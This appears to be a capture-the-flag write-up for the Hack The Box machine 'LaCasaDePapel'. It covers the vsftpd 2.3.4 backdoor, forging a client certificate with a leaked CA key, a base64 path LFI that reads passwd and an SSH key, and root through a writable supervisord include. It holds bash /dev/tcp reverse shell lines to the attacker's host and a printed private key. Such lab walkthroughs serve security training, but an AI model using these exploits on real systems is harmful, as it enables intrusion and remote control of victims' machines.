# LaCasaDePapel
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `ftp` user | vsftpd 2.3.4 Backdoor (CVE-2011-2523) | Identified vsftpd 2.3.4 running on port 21, a version known to have a backdoor. Exploited the backdoor by logging in with the username ending in a smiley face `:)`, which caused the FTP server to spawn a shell on port 6200. Connected to port 6200 and gained a PHP interactive shell, but with disabled command execution functions. |
| 2 | `professor` | LFI via Client-Side Certificate & Key Re-use | Discovered the website on port 443 required a client-side certificate for access. Used the PHP shell to enumerate files and found a **ca.key** in `/home/nairobi/`. Generated a valid client certificate using this key. Accessed the website and found a Local File Inclusion (LFI) vulnerability. Used the LFI to read `/home/berlin/.ssh/id_rsa`, but it didn't work for `berlin`. The key was valid for user **professor** due to key re-use. Logged in as `professor` via SSH. |
| 3 | `root` | Cron Job & Path Hijacking | After gaining access as `professor`, identified a cron job running a Node.js script. This script was configured via a file named **memcached.ini**, which was included by a root-owned `supervisord` process. Replaced `memcached.ini` with a malicious file containing a reverse shell command. The cron job executed the command as **root**, granting a root shell. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|   http/1.1
|_  http/1.0
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
Service Info: OS: Unix
```
On port 21 we can instantly recognize a vulnerable service: vsftpd 2.3.4.  
This software is affected by a backdoor vulnerability.  
First thing first let's check available exploits for vsftpd.
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                                                                             | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                                                                             | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                                                                             | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                                                                           | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                                     | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                                                  | unix/remote/49757.py
vsftpd 3.0.3 - Remote Denial of Service                                                                                                                                                                    | multiple/remote/49719.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
As we can notice we have two available exploits: one metasploit module and one python script.
## Foothold
As always, before going for automatic exploitation, let's check what the exploit is actually doing and exploit it manually.  
Without too much effort, we can notice that to trigger the backdoor command execution, we just need to append a colon and a parenthesis ':)' at the end of the username.  
This will spawn a listening connection on port 6200.  
So, now, we can simply:
```
[root@kali exploits ]$ ftp $TARGET
Connected to 10.10.10.131.
220 (vsFTPd 2.3.4)
Name (10.10.10.131:root): b0d:)
331 Please specify the password.
Password:
```
and netcat to port 6200, as we can see we get a php interactive shell.  
```
[root@kali LaCasaDePapel ]$ nc $TARGET 6200     
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
```
since this shell is messy and the output is not displayed well, we can use rlwrap in order to have a more interactive terminal.  
rlwrap runs the specified command, intercepting user input in order to provide readline's line editing, persistent history and completion.
This is actually a wrapper for a command that provides history and tab completition.  
now, from this php interactive shell, unfortunately, we cannot spawn any bash shell, since all functions for command execution are disabled:  
```
[root@kali LaCasaDePapel ]$ rlwrap nc 10.10.10.131 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
ls
Variables: $tokyo
system("ping 10.10.14.5");
PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1
```
If we run phpinfo() function, we can see that system is disabled
```
phpinfo();
[... SNIP ...]
disable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source =>
[... SNIP ...]
```
We can try to bypass the disable_functions, using [this source](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass) but unfortunately, none of this methods works.
```
proc_close(proc_open("uname -a",array(),$something));
PHP Fatal error:  Call to undefined function proc_open() in Psy Shell code on line 1
preg_replace('/.*/e', 'system("whoami");', '');
PHP Warning:  preg_replace(): The /e modifier is no longer supported, use preg_replace_callback instead in phar://eval()'d code on line 1
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
PHP Fatal error:  Call to undefined function pcntl_exec() in Psy Shell code on line 1
file_put_contents('/tmp/rev.sh', base64_decode('YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMSc='));
=> 50
file_get_contents('/tmp/rev.sh')
=> "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
chmod('/tmp/rev.sh', 0777 );
=> true
mail('', '', '', '', '-H exec "/tmp/rev.sh"');
sendmail: NOOP failed
=> false
```
so we need to enumerate the system and grab all the possible information using this shell.  
To achieve this we can use three main php functions:  
* scandir('/path') : List directory
* file_get_contents('/path') : display content of a file
* file_put_contents('/path') : write a file
Poking around on the box we can found an intresting file under /home/nairobi/ca.key.  
Let's store this file on our local box by coping the output of
```
file_get_contents("/home/nairobi/ca.key")
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   """
```

## User
Since we came to a dead end let's poke around on port 80 and 443.  
port 80 shows a google authenticator qrcode and it's also asking for an email address. Configuring the authenticator does not lead to anywhere, so let's move to port 443.  
Here the site is asking for a valid client certificate, so let's generate a client certificate using the ca.key we just found.  
Now that we have the private key ca.key, the only thing else we need is the certificate chain from the web server, which we can get using our web browser, and then we will be able to sign our own certificate.
Once we get the ca key we can verify that the public key downloaded from firefox is the same that can be generated from the leaked private key, if that's the case, this means that we can generate a valid client certificate using ca.key.  
Let's get public key from the private.
```
[root@kali ssl ]$ openssl pkey -in ca.key -pubout     
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/
5vJpuaxJF3A5q2rVQJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e
8DR9ksBQYyXqOZZ8/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsO
hl4+KB4cM4hNhE5B4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVz
mhlHVypqsfS9rKUVESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55Z
D66vQBSkN2PwBeiRPBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wM
ZwIDAQAB
-----END PUBLIC KEY-----
```
 Let's get the public key from the certificate chain:
 ```
 [root@kali ssl ]$ openssl x509 -in ca.pem -pubkey -noout  
 -----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/
 5vJpuaxJF3A5q2rVQJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e
 8DR9ksBQYyXqOZZ8/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsO
 hl4+KB4cM4hNhE5B4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVz
 mhlHVypqsfS9rKUVESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55Z
 D66vQBSkN2PwBeiRPBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wM
 ZwIDAQAB
 -----END PUBLIC KEY-----
 ```
 As we can verify, keys are the same:
 ```
 [root@kali ssl ]$ openssl pkey -in ca.key -pubout | md5sum; openssl x509 -in ca.pem -pubkey -noout |md5sum;
 71e2b2ca7b610c24d132e3e4c06daf0c  -
 71e2b2ca7b610c24d132e3e4c06daf0c  -
 ```
 Now that we verified that the public key is the same of the certificate private key, and we do have the leaked certificate private key, we can generate the client key with:
```
[root@kali LaCasaDePapel ]$ openssl genrsa -out client.key 4096
Generating RSA private key, 4096 bit long modulus (2 primes)
.........................................................................++++
...............................................++++
e is 65537 (0x010001)
```
 Now we need to create a certificate signing request:
```
[root@kali ssl ]$ openssl req -new -key client.key -out client.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.                                                                                     
What you are about to enter is what is called a Distinguished Name or a DN.                                        
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.                                                                    
-----                 
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:NY
Locality Name (eg, city) []:NYC
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Marvel
Organizational Unit Name (eg, section) []:DC
Common Name (e.g. server FQDN or YOUR name) []:b0d
Email Address []:sslurp@protonmail.com

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```
 Now that we have the certificate signing request we can sign our certificate
 ```
 [root@kali ssl ]$ openssl x509 -req -in client.csr -CA ca.pem -CAkey ca.key -set_serial 9001 -extensions client -da
 ys 9002 -outform PEM -out client.cer
 Signature ok
 subject=C = US, ST = NY, L = NYC, O = Marvel, OU = DC, CN = b0d, emailAddress = sslurp@protonmail.com
 Getting CA Private Key
 ```
now we need to convert the certificate in a format that can be interpreted by firefox.  
To do so we can run the following command.  
```
[root@kali ssl ]$ openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12                  
Enter Export Password:
Verifying - Enter Export Password:
```
that is just a combination of client.key and client.cer and client.cer is just a signed version of the .csr.  
Now we can import the certificate and try to access the website again.  
As we can see we get a list of .avi files.  
If we notice the .avi files URLs carefully, we can see that there is a string that is slightly changing from one to another.  
If we try do base64 decode the URL, we can see that this is leaking the filepath.  
Now we can try to see if we can do a LFI injecting unexpected file paths, for example:  
```
GET /file/Li4vLi4vLi4vZXRjL3Bhc3N3ZA== HTTP/1.1
Host: lacasadepapel.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://lacasadepapel.htb/?path=SEASON-1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Te: trailers
Connection: close
```
(Li4vLi4vLi4vZXRjL3Bhc3N3ZA== is ../../../etc/passwd) we do get:  
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-disposition: attachment; filename=passwd
Content-Length: 1548
Date: Tue, 25 Jan 2022 18:25:59 GMT
Connection: close

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin
dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh
berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash
professor:x:1002:1002:professor,,,:/home/professor:/bin/ash
vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin
memcached:x:102:102:memcached:/home/memcached:/sbin/nologin
```
So that's confirm that we have a LFI.  
Poking around on the server for private keys, we can find /home/berlin/.ssh/id_rsa, we can use the LFI to exfiltrate this key, since it seems like this process is running as user berlin.  
Unfortunately this key does not allow us to login as berlin, but if we do try this key for all this users we'll see that this key is valid for user 'professor'
```
[root@kali LaCasaDePapel ]$ ssh -i id_rsa_berlin -l professor $TARGET

 _             ____                  ____         ____                  _
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$
```

## Root
First thing, as always, let's run linpeas.sh to enumerate the system for privilege escalation vectors.  
Unfortunately linpeas does not give us a clear path to follow but it indicate us interesting files.  
```
╔══════════╣ Modified interesting files in the last 5mins (limit 100)                                   
/tmp/memcached-stderr---supervisor-cKO4Ff.log                                                                         
/tmp/memcached-stdout---supervisor-nDHLgK.log                                                                         
/var/log/messages  
```
as we can notice, under professor home, we actually have two 'memcached' files, so we can suppose that this tmp files are created by a cron process.  
If we open memcached.ini we can see something that is clearly interesting for our purpose.  
```
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```
So, let's see if this process/file is called by a cron.  
To do so, let's run pspy64.  
as we can see we do have a cron process running every minute, that is triggering the following actions on the system:
```
2022/01/25 21:27:01 CMD: UID=0    PID=27562  | /usr/bin/python2 /usr/bin/supervisord --nodaemon --pidfile /var/run/supervisord.pid --configuration /etc/supervisord.conf
2022/01/25 21:27:01 CMD: UID=0    PID=27564  |
2022/01/25 21:27:04 CMD: UID=0    PID=27570  | sudo -u nobody /usr/bin/node /home/professor/memcached.js
```
since we cannot open /etc/supervisord.conf or /home/professor/memcached.js due to permissions, let's run pspy with -f flag to monitor filesystem events.  
As we can see after the above process is executed, we can see an access request to memcached.ini
```
2022/01/25 21:31:03 CMD: UID=0    PID=27832  | /usr/bin/python2 /usr/bin/supervisord --nodaemon --pidfile /var/run/supervisord.pid --configuration /etc/supervisord.conf
2022/01/25 21:31:03 FS:                 OPEN | /etc/supervisord.conf                                                  
2022/01/25 21:31:03 FS:               ACCESS | /etc/supervisord.conf                                                  
2022/01/25 21:31:03 FS:             OPEN DIR | /home/professor                                                        
2022/01/25 21:31:03 FS:             OPEN DIR | /home/professor/                                                                                                                                                                              
2022/01/25 21:31:03 FS:           ACCESS DIR | /home/professor                                                                                                                                                                               
2022/01/25 21:31:03 FS:           ACCESS DIR | /home/professor/                                                       
2022/01/25 21:31:03 FS:           ACCESS DIR | /home/professor                                                        
2022/01/25 21:31:03 FS:           ACCESS DIR | /home/professor/                                                       
2022/01/25 21:31:03 FS:    CLOSE_NOWRITE DIR | /home/professor                                                                                                                                                                               
2022/01/25 21:31:03 FS:    CLOSE_NOWRITE DIR | /home/professor/                                                       
2022/01/25 21:31:03 FS:                 OPEN | /home/professor/memcached.ini                                                                                                                                                                 
2022/01/25 21:31:03 FS:               ACCESS | /home/professor/memcached.ini                                          
2022/01/25 21:31:03 FS:        CLOSE_NOWRITE | /home/professor/memcached.ini         
```
this means that somehow the configuration file includes the .ini file under the professor home directory.  
Now, all we have to do is to change memcached.ini file with a reverse shell.  
We can see that we cannot write memcached.ini and that it is owned by root.  
```
lacasadepapel [~]$ ls -la
total 28
drwxr-sr-x    4 professo professo      4096 Jan 25 21:38 .
drwxr-xr-x    7 root     root          4096 Feb 16  2019 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -> /dev/null
drwx------    2 professo professo      4096 Jan 31  2019 .ssh
-rw-r--r--    1 professo professo        88 Jan 25 21:38 mem.ini
-rw-r--r--    1 professo professo        88 Jan 25 21:38 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29  2019 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29  2019 node_modules
```
Since this file is in the current user home directory which has the full permission on this, we can delete the file and create a new memcached.ini file (with new permissions) and waid for supervisord to trigger the execution.  
```
lacasadepapel [~]$ cp memcached.ini mem.ini
lacasadepapel [~]$ rm memcached.ini
lacasadepapel [~]$ cat mem.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ vi memcached.ini
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
```
now, all we have to do is open a listening netcat connection and wait for the cron execution:
```
root@kali:~/Documents/HTB/Boxes/LaCasaDePapel# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.131] 44964
bash: cannot set terminal process group (28467): Not a tty
bash: no job control in this shell
bash-4.4#

bash-4.4# whoami
root
```
now that we are root, we can check the /etc/supervisord.conf to understand why the memcached.ini file gets included.  
```
bash-4.4# cat /etc/supervisord.conf
[unix_http_server]
file=/run/supervisord.sock

[supervisord]
logfile=/dev/null
logfile_maxbytes=0
user=root

[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface

[supervisorctl]
serverurl=unix:///run/supervisord.sock

[include]
files = /home/professor/*.ini
```
